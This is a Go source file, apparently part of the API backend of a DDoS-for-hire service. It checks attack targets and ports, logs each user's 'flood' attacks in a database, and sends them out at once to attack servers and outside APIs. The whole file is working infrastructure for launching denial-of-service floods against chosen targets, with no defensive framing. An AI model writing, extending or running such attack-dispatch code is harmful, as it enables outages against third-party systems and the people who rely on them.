package attackapi

import (
	"api/core/database"
	"api/core/models/floods"
	"api/core/models/apis"
	"api/core/models/servers"
	"errors"
	"fmt"
	"net"
	"net/url"
	"strconv"
	"time"
	"sync"
)


func ValidateTarget(target string, blacklists []string) error {
	// Check if the target is an IPv4 address.
	if net.ParseIP(target) != nil {
		if inBlacklist(target, blacklists) {
			return errors.New("target is blacklisted")
		}
		return nil
	}

	// Try parsing as URL.
	parsedURL, err := url.Parse(target)
	if err != nil {
		return errors.New("invalid target provided")
	}
	host := parsedURL.Hostname()
	if host == "" {
		host = target
	}

	// Simple DNS lookup to verify the host.
	addrs, err := net.LookupHost(host)
	if err != nil || len(addrs) == 0 {
		return errors.New("target is not resolvable")
	}

	if inBlacklist(target, blacklists) {
		return errors.New("target is blacklisted")
	}

	return nil
}

func ValidatePort(portStr string) (int, error) {
	port, err := strconv.Atoi(portStr)
	if err != nil || port < 0 || port > 65535 {
		return 0, errors.New("invalid destination port provided")
	}
	return port, nil
}

func inBlacklist(target string, blacklists []string) bool {
	for _, b := range blacklists {
		if b == target {
			return true
		}
	}
	return false
}

func SaveToDB(user *database.User, flood *floods.Attack, conns int) ([]int, error) {
    var ids []int
    for i := 0; i < conns; i++ {
        id, err := database.Container.NewAttack(user, flood)
        if err != nil {
            return nil, fmt.Errorf("database error occurred: %w", err)
        }
        ids = append(ids, id)
        time.Sleep(500 * time.Microsecond)
    }
    return ids, nil
}

func SendAttack(conns int, flood *floods.Attack) (string, error) {
	var (
		wg          sync.WaitGroup
		errChan     = make(chan error, conns+1)
		serverOK    bool
		apiOK       bool
		serverErr   error
		apiErr      error
	)

	wg.Add(conns + 1)

	// Send to servers
	for i := 0; i < conns; i++ {
		go func() {
			defer wg.Done()
			if err := servers.Distribute(flood); err != nil {
				errChan <- fmt.Errorf("server[%d] error: %v", i, err)
			} else {
				serverOK = true
			}
		}()
	}

	// Send to APIs
	go func() {
		defer wg.Done()
		if err := apis.Send(flood); err != nil {
			errChan <- fmt.Errorf("API error: %v", err)
		} else {
			apiOK = true
		}
	}()

	// Wait for all goroutines to complete
	wg.Wait()
	close(errChan)

	// Collect errors
	for err := range errChan {
		if serverErr == nil {
			serverErr = err
		} else {
			apiErr = err
		}
	}

	// Construct success message
	var successMsg string
	if serverOK && apiOK {
		successMsg = "Success: both servers and API"
	} else if serverOK {
		successMsg = "Success: servers only"
	} else if apiOK {
		successMsg = "Success: API only"
	}

	// If at least one succeeded, return successMsg with nil error
	if serverOK || apiOK {
		return successMsg, nil
	}

	// Otherwise, return a formatted error message
	var errMsg string
	if serverErr != nil {
		errMsg += fmt.Sprintf("server error: %v", serverErr)
	}
	if apiErr != nil {
		if errMsg != "" {
			errMsg += ", "
		}
		errMsg += fmt.Sprintf("API error: %v", apiErr)
	}

	return "", fmt.Errorf("Attack failed: %s", errMsg)
}
